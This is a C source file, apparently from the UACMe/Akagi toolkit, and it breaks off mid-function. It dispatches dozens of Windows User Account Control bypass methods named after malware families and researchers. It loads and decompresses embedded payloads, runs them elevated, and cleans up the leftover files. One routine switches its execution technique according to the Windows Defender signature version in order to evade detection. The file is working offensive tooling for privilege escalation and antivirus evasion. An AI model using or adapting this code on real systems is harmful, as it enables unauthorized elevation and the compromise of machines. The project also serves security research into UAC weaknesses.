/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       METHODS.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodTest);
UCM_API(MethodSysprep);
UCM_API(MethodACRedirectEXE);
UCM_API(MethodACBinaryPath);
UCM_API(MethodSimda);
UCM_API(MethodCarberp);
UCM_API(MethodAVrf);
UCM_API(MethodWinsat);
UCM_API(MethodMMC);
UCM_API(MethodMMC2);
UCM_API(MethodSirefef);
UCM_API(MethodGeneric);
UCM_API(MethodGWX);
UCM_API(MethodSysprep4);
UCM_API(MethodManifest);
UCM_API(MethodInetMg);
UCM_API(MethodSXS);
UCM_API(MethodDism);
UCM_API(MethodComet);
UCM_API(MethodEnigma0x3);
UCM_API(MethodEnigma0x3_2);
UCM_API(MethodExpLife);
UCM_API(MethodSandworm);
UCM_API(MethodEnigma0x3_3);
UCM_API(MethodWow64Logger);
UCM_API(MethodEnigma0x3_4);
UCM_API(MethodUiAccess);
UCM_API(MethodMsSettings);
UCM_API(MethodTyranid);
UCM_API(MethodTokenMod);
UCM_API(MethodJunction);
UCM_API(MethodSXSDccw);
UCM_API(MethodHakril);
UCM_API(MethodCorProfiler);
UCM_API(MethodCOMHandlers);
UCM_API(MethodCMLuaUtil);
UCM_API(MethodFwCplLua);
UCM_API(MethodDccwCOM);
UCM_API(MethodVolatileEnv);
UCM_API(MethodSluiHijack);
UCM_API(MethodBitlockerRC);
UCM_API(MethodCOMHandlers2);
UCM_API(MethodSPPLUAObject);
UCM_API(MethodCreateNewLink);
UCM_API(MethodDateTimeStateWriter);
UCM_API(MethodAcCplAdmin);
UCM_API(MethodDirectoryMock);
UCM_API(MethodShellSdctl);
UCM_API(MethodEgre55);
UCM_API(MethodTokenModUIAccess);
UCM_API(MethodShellWSReset);

UCM_EXTRA_CONTEXT WDCallbackType1;

#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 5
ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
    UacMethodMMC1,
    UacMethodInetMgr,
    UacMethodWow64Logger,
    UacMethodHakril,
    UacMethodDateTimeWriter,
};

UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
    { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 9600, 10240 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodACRedirectEXE, NULL, { 7600, 10240 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodSimda, NULL, { 7600, 10136 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodAVrf, NULL, { 7600, 10136 }, HIBIKI_ID, FALSE, TRUE, TRUE },
    { MethodWinsat, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodACBinaryPath, NULL, { 7600, 10240 }, FUBUKI_ID, TRUE, FALSE, TRUE },
    { MethodSysprep, NULL, { 10240, 10586 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMMC, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSirefef, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodGeneric, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodGWX, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep4, NULL, { 9600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodManifest, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodInetMg, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMMC2, NULL, { 7600, 16232 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSXS, NULL, { 7600, 16232 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSXS, NULL, { 7600, MAXDWORD }, IKAZUCHI_ID, FALSE, TRUE, TRUE },
    { MethodDism, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodComet, NULL, { 7600, 15031 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodEnigma0x3, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, FALSE },
    { MethodEnigma0x3_2, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodExpLife, NULL, { 7600, 16199 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodSandworm, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodEnigma0x3_3, NULL, { 10240, 16215 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodWow64Logger, NULL, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodEnigma0x3_4, NULL, {10240, 17000 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodUiAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMsSettings, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTyranid, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTokenMod, NULL, { 7600, 17686 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodJunction, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodHakril, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodCOMHandlers, NULL, { 7600, 18362 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodFwCplLua, &WDCallbackType1, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSluiHijack, &WDCallbackType1, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodCOMHandlers2, &WDCallbackType1, { 7600, 18362 }, FUJINAMI_ID, FALSE, TRUE, TRUE },
    { MethodSPPLUAObject, NULL, { 7600, 17763 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodCreateNewLink, NULL, { 7600, 14393 }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
    { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodDirectoryMock, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodShellSdctl, &WDCallbackType1, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE },
    { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
    { MethodShellWSReset, &WDCallbackType1, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE }
};

#define WDCallbackTypeMagicVer1 282647531814912
#define WDCallbackTypeMagicVer2 282733539622912


/*
* SetMethodExecutionType
*
* Purpose:
*
* ExtraContext callback.
*
*/
NTSTATUS CALLBACK SetMethodExecutionType(
    _In_ PVOID Parameter
)
{
#ifdef _DEBUG
    WCHAR szBuffer[100];
#endif
    UCM_METHOD Method = (UCM_METHOD)PtrToUlong(Parameter);
    MPCOMPONENT_VERSION SignatureVersion;

    if (g_ctx->hMpClient == NULL)
        return STATUS_DLL_NOT_FOUND;

    if (wdIsEnabled() != STATUS_TOO_MANY_SECRETS)
        return STATUS_NOT_FOUND;

    RtlSecureZeroMemory(&SignatureVersion, sizeof(SignatureVersion));

    if (wdGetAVSignatureVersion(&SignatureVersion)) {

#ifdef _DEBUG
        szBuffer[0] = 0;
        u64tostr(SignatureVersion.Version, &szBuffer[0]);
        OutputDebugString(szBuffer);
#endif

        //
        // In fact it doesn't matter as their detection based on totally 
        // fucked up behavior rules which observation produced mixed results.
        // We keep this as it doesn't affect program work.
        //
        switch (Method) {

        case UacMethodSluiHijack:
            if (SignatureVersion.Version >= WDCallbackTypeMagicVer1) {
                g_ctx->MethodExecuteType = ucmExTypeRegSymlink;
            }
            else {
                g_ctx->MethodExecuteType = ucmExTypeDefault;
            }
            break;
        case UacMethodFwCplLua:
            if (SignatureVersion.Version >= WDCallbackTypeMagicVer1) {
                g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
            }
            else {
                g_ctx->MethodExecuteType = ucmExTypeDefault;
            }
            break;

        case UacMethodCOMHandlers2:
        case UacMethodShellSdclt:
        case UacMethodShellWSReset:
            if (SignatureVersion.Version >= WDCallbackTypeMagicVer2) {
                g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
            }
            else {
                g_ctx->MethodExecuteType = ucmExTypeDefault;
            }
            break;

        default:
            break;
        }
    }

    return STATUS_SUCCESS;
}

/*
* IsMethodImplementedForWin32
*
* Purpose:
*
* Check if method implemented in win32 version.
*
*/
__forceinline BOOL IsMethodImplementedForWin32(
    _In_ UCM_METHOD Method)
{
    UINT i;
    for (i = 0; i < UCM_WIN32_NOT_IMPLEMENTED_COUNT; i++)
        if (UCM_WIN32_NOT_IMPLEMENTED[i] == (ULONG)Method)
            return FALSE;
    return TRUE;
}

/*
* IsMethodMatchRequirements
*
* Purpose:
*
* Check system requirements of the given method.
*
*/
NTSTATUS IsMethodMatchRequirements(
    _In_ PUCM_API_DISPATCH_ENTRY Entry
)
{
#ifdef _DEBUG
    UNREFERENCED_PARAMETER(Entry);
#else
    WCHAR szMessage[MAX_PATH];
    //
    //  Check Wow64 flags first. Disable this check for debugging build.
    //
    if (g_ctx->IsWow64) {
        if (Entry->DisallowWow64) {
            ucmShowMessage(g_ctx->OutputToDebugger, WOW64STRING);
            return STATUS_NOT_SUPPORTED;
        }
    }
#ifdef _WIN64
    else {
        //
        // Not required if Win32.
        //
        if (Entry->Win32OrWow64Required != FALSE) {
            ucmShowMessage(g_ctx->OutputToDebugger, WOW64WIN32ONLY);
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif //_WIN64

    //
    //  Check availability. Disable this check for debugging build.
    //
    if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
        RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
        _strcpy(szMessage, L"Current Windows Build: ");
        ultostr(g_ctx->dwBuildNumber, _strend(szMessage));
        _strcat(szMessage, L"\nMinimum Windows Build Required: ");
        ultostr(Entry->Availability.MinumumWindowsBuildRequired, _strend(szMessage));
        _strcat(szMessage, L"\nAborting execution.");
        ucmShowMessage(g_ctx->OutputToDebugger, szMessage);
        return STATUS_NOT_SUPPORTED;
    }
    if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
        if (ucmShowQuestion(UACFIX) == IDNO) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif
    return STATUS_SUCCESS;
}

/*
* SetupExtraContextCalbacks
*
* Purpose:
*
* Configure extra context callbacks.
*
*/
VOID SetupExtraContextCalbacks(
    _In_ UCM_METHOD Method,
    _In_ PUCM_EXTRA_CONTEXT Context
)
{
    switch (Method) {
    case UacMethodSluiHijack:
    case UacMethodFwCplLua:
    case UacMethodCOMHandlers2:
    case UacMethodShellSdclt:
    case UacMethodShellWSReset:
        Context->Parameter = ULongToPtr(Method);
        Context->Routine = SetMethodExecutionType;
        break;
    default:
        Context->Parameter = NULL;
        Context->Routine = NULL;
        break;
    }
}

/*
* PostCleanupAttempt
*
* Purpose:
*
* Attempt to cleanup left overs.
*
*/
VOID PostCleanupAttempt(
    _In_ UCM_METHOD Method
)
{
    switch (Method) {

    case UacMethodSysprep1:
    case UacMethodSysprep2:
    case UacMethodSysprep3:
    case UacMethodSysprep4:
    case UacMethodSysprep5:
    case UacMethodTilon:
        ucmSysprepMethodsCleanup(Method);
        break;

    case UacMethodOobe:
        ucmOobeMethodCleanup();
        break;

    case UacMethodAVrf:
        ucmMethodCleanupSingleItemSystem32(HIBIKI_DLL);
        break;

    case UacMethodDISM:
        ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
        break;

    case UacMethodWow64Logger:
        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
        break;

    case UacMethodGeneric:
        ucmMethodCleanupSingleItemSystem32(NTWDBLIB_DLL);
        break;

    case UacMethodJunction:
        ucmJunctionMethodCleanup();
        break;

    case UacMethodSirefef:
        ucmSirefefMethodCleanup();
        break;

    case UacMethodMMC1:
    case UacMethodMMC2:
        ucmMMCMethodCleanup(Method);
        break;

    case UacMethodSXS:
        ucmSXSMethodCleanup(FALSE);
        break;

    case UacMethodSXSConsent:
        ucmSXSMethodCleanup(TRUE);
        break;

    case UacMethodSXSDccw:
        ucmSXSDccwMethodCleanup();
        break;

    case UacMethodHakril:
        ucmHakrilMethodCleanup();
        break;

    case UacMethodCreateNewLink:
        ucmCreateNewLinkMethodCleanup();
        break;

    default:
        break;
    }
}

/*
* MethodsManagerCall
*
* Purpose:
*
* Run method by method id.
*
*/
NTSTATUS MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL        bParametersBlockSet = FALSE;
    NTSTATUS    MethodResult, Status;
    ULONG       PayloadSize = 0, DataSize = 0;
    PVOID       PayloadCode = NULL, Resource = NULL;
    PVOID       ImageBaseAddress = g_hInstance;

    PUCM_API_DISPATCH_ENTRY Entry;
    PUCM_EXTRA_CONTEXT ExtraContext;

    UCM_PARAMS_BLOCK ParamsBlock;
    LARGE_INTEGER liDueTime;

    if (Method >= UacMethodMax)
        return STATUS_INVALID_PARAMETER;

    //
    // Is method implemented for Win32?
    //
#ifndef _WIN64
    if (!IsMethodImplementedForWin32(Method)) {
        return STATUS_NOT_SUPPORTED;
    }
#endif //_WIN64

    Entry = &ucmMethodsDispatchTable[Method];

    Status = IsMethodMatchRequirements(Entry);
    if (!NT_SUCCESS(Status))
        return Status;

    if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {

        Resource = supLdrQueryResourceData(
            Entry->PayloadResourceId,
            ImageBaseAddress,
            &DataSize);

        if (Resource) {
            PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
        }

        if ((PayloadCode == NULL) || (PayloadSize == 0)) {
            return STATUS_DATA_ERROR;
        }
    }

    ExtraContext = Entry->ExtraContext;
    if (ExtraContext) {
        SetupExtraContextCalbacks(Method, ExtraContext);
        if (ExtraContext->Routine)
            ExtraContext->Routine(ExtraContext->Parameter);
    }

    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;

    //
    // Set shared parameters.
    //
    //   1. Execution parameters (flag, session id, winstation\desktop)
    //   2. Optional parameter from Akagi command line.
    //
    if (Entry->SetParameters) {
        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
    }

    MethodResult = Entry->Routine(&ParamsBlock);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        supVirtualFree(PayloadCode, NULL);
    }

    //
    // Wait a little bit for completion.
    //
    if (Entry->SetParameters) {
        if (bParametersBlockSet) {
            if (g_ctx->SharedContext.hCompletionEvent) {
                liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(200000, 10000);
                NtWaitForSingleObject(g_ctx->SharedContext.hCompletionEvent, FALSE, &liDueTime);
            }
            supDestroySharedParametersBlock(g_ctx);
        }
    }

    PostCleanupAttempt(Method);

    return MethodResult;
}

/************************************************************
**
**
**
** Method table wrappers
**
**
**
************************************************************/

UCM_API(MethodTest)
{
#ifdef _DEBUG
    return ucmTestRoutine(Parameter->PayloadCode, Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return TRUE;
#endif
}

UCM_API(MethodSysprep)
{
    return ucmStandardAutoElevation(
        Parameter->Method,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodACRedirectEXE)
{
    LPWSTR lpszPayload;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength != 0)
        lpszPayload = g_ctx->szOptionalParameter;
    else
        lpszPayload = g_ctx->szDefaultPayload;

    return ucmShimRedirectEXE(lpszPayload);
}

UCM_API(MethodACBinaryPath)
{
#ifdef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmShimPatch(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodSimda)
{
    UNREFERENCED_PARAMETER(Parameter);

    //
    // Make sure user understand aftereffects.
    //
    if (ucmShowQuestion(
        TEXT("This method will permanently TURN UAC OFF, are you sure?")) == IDYES)
    {
        return ucmSimdaTurnOffUac();
    }
    return STATUS_CANCELLED;
}

UCM_API(MethodCarberp)
{
    //
    // Additional checking for UacMethodCarberp1. 
    // Target application 'migwiz' unavailable in Syswow64 after Windows 7.
    //
    if (Parameter->Method == UacMethodCarberp1) {
        if ((g_ctx->IsWow64) && (g_ctx->dwBuildNumber > 7601)) {
            ucmShowMessage(g_ctx->OutputToDebugger, WOW64STRING);
            return STATUS_UNKNOWN_REVISION;
        }
    }
    return ucmWusaMethod(
        Parameter->Method,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodAVrf)
{
    return ucmAvrfMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodWinsat)
{
    BOOL UseWusa = FALSE;
    LPWSTR lpFileName;

    //
    //  Additional checking.
    //  Switch used filename because of \KnownDlls changes.
    //
    if (g_ctx->dwBuildNumber < 9200) {
        lpFileName = POWRPROF_DLL;
    }
    else {
        lpFileName = DEVOBJ_DLL;
    }

    //
    //  Use Wusa where available.
    //
    UseWusa = (g_ctx->dwBuildNumber <= 10136);

    return ucmWinSATMethod(
        lpFileName,
        Parameter->PayloadCode,
        Parameter->PayloadSize,
        UseWusa);
}

UCM_API(MethodMMC)
{
    //
    //  Required dll dependency not exist in x86-32
    //
#ifdef _WIN64
    return ucmMMCMethod(
        Parameter->Method,
        ELSEXT_DLL,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodMMC2)
{
    return ucmMMCMethod(
        Parameter->Method,
        WBEMCOMN_DLL,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSirefef)
{
    return ucmSirefefMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodGeneric)
{
    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, CLICONFG_EXE);

    return ucmGenericAutoelevation(
        szBuffer,
        NTWDBLIB_DLL,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodGWX)
{
    return ucmGWX(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSysprep4)
{
    return ucmStandardAutoElevation2(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodManifest)
{
    return ucmAutoElevateManifest(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodInetMg)
{
#ifdef _WIN64
    return ucmInetMgrMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodSXS)
{
    BOOL bConsentItself = FALSE;
    LPWSTR lpTargetDirectory = NULL;
    LPWSTR lpTargetApplication = NULL;
    LPWSTR lpLaunchApplication = NULL;

    //
    // Select parameters depending on method used.
    //
    if (Parameter->Method == UacMethodSXS) {
        bConsentItself = FALSE;
        lpTargetDirectory = SYSPREP_DIR;
        lpTargetApplication = SYSPREP_EXE;
        lpLaunchApplication = NULL;
    }
    else {
        if (Parameter->Method == UacMethodSXSConsent) {

            //
            // Make sure user understand aftereffects.
            //
#ifndef _DEBUG
            if (ucmShowQuestion(
                TEXT("WARNING: This method will affect UAC interface, are you sure?")) != IDYES)
            {
                return STATUS_CANCELLED;
            }
#endif //_DEBUG
            bConsentItself = TRUE;
            lpTargetDirectory = NULL;
            lpTargetApplication = CONSENT_EXE;
            lpLaunchApplication = EVENTVWR_EXE;
        }
    }

    if (lpTargetApplication == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    return ucmSXSMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize,
        lpTargetDirectory,
        lpTargetApplication,
        lpLaunchApplication,
        bConsentItself);
}

UCM_API(MethodDism)
{
    return ucmDismMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodComet)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select payload, if none default will be executed.
    //
    if (g_ctx->OptionalParameterLength != 0)
        lpszPayload = g_ctx->szOptionalParameter;
    else
        lpszPayload = g_ctx->szDefaultPayload;

    return ucmCometMethod(lpszPayload);
}

UCM_API(MethodEnigma0x3)
{
    LPWSTR lpszTargetApp = NULL;
    LPWSTR lpszPayload = NULL;

    //
    // Select target application.
    //
    if (g_ctx->dwBuildNumber >= 15007)
        lpszTargetApp = COMPMGMTLAUNCHER_EXE;
    else
        lpszTargetApp = EVENTVWR_EXE;

    //
    // Select payload, if none default will be executed.
    //
    if (g_ctx->OptionalParameterLength != 0)
        lpszPayload = g_ctx->szOptionalParameter;
    else
        lpszPayload = NULL;

    return ucmHijackShellCommandMethod(
        lpszPayload,
        lpszTargetApp,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodEnigma0x3_2)
{
    return ucmDiskCleanupRaceCondition(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodExpLife)
{
    LPWSTR lpszParameter;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszParameter = g_ctx->szDefaultPayload;
    else
        lpszParameter = g_ctx->szOptionalParameter;

    return ucmUninstallLauncherMethod(lpszParameter);
}

UCM_API(MethodSandworm)
{
    return ucmSandwormMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodEnigma0x3_3)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmAppPathMethod(
        lpszPayload,
        CONTROL_EXE,
        SDCLT_EXE);
}

UCM_API(MethodWow64Logger)
{
    //
    //  Required x64 as this method abuse wow64 logger mechanism
    //
#ifdef _WIN64
    return ucmWow64LoggerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodEnigma0x3_4)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmSdcltIsolatedCommandMethod(lpszPayload);
}

UCM_API(MethodUiAccess)
{
    return ucmUiAccessMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodMsSettings)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmMsSettingsDelegateExecuteMethod(lpszPayload);
}

UCM_API(MethodTyranid)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
}

UCM_API(MethodTokenMod)
{
    LPWSTR lpszPayload = NULL;
    BOOL fUseCommandLine;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0) {
        lpszPayload = g_ctx->szDefaultPayload;
        fUseCommandLine = FALSE;
    }
    else {
        lpszPayload = g_ctx->szOptionalParameter;
        fUseCommandLine = TRUE;
    }

    return ucmTokenModification(
        lpszPayload,
        fUseCommandLine);
}

UCM_API(MethodJunction)
{
    return ucmJunctionMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSXSDccw)
{
    return ucmSXSDccwMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodHakril)
{
#ifdef _WIN64
    return ucmHakrilMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodCorProfiler)
{
    return ucmCorProfilerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCOMHandlers)
{
    return ucmCOMHandlersMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCMLuaUtil)
{
    LPWSTR lpszParameter;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszParameter = g_ctx->szDefaultPayload;
    else
        lpszParameter = g_ctx->szOptionalParameter;

    return ucmCMLuaUtilShellExecMethod(lpszParameter);
}

UCM_API(MethodFwCplLua)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmFwCplLuaMethod(lpszPayload);
}

UCM_API(MethodDccwCOM)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDccwCOMMethod(lpszPayload);
}

UCM_API(MethodVolatileEnv)
{
    return ucmVolatileEnvMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSluiHijack)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmSluiHijackMethod(lpszPayload);
}

UCM_API(MethodBitlockerRC)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmBitlockerRCMethod(lpszPayload);
}

UCM_API(MethodCOMHandlers2)
{
    return ucmCOMHandlersMethod2(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSPPLUAObject)
{
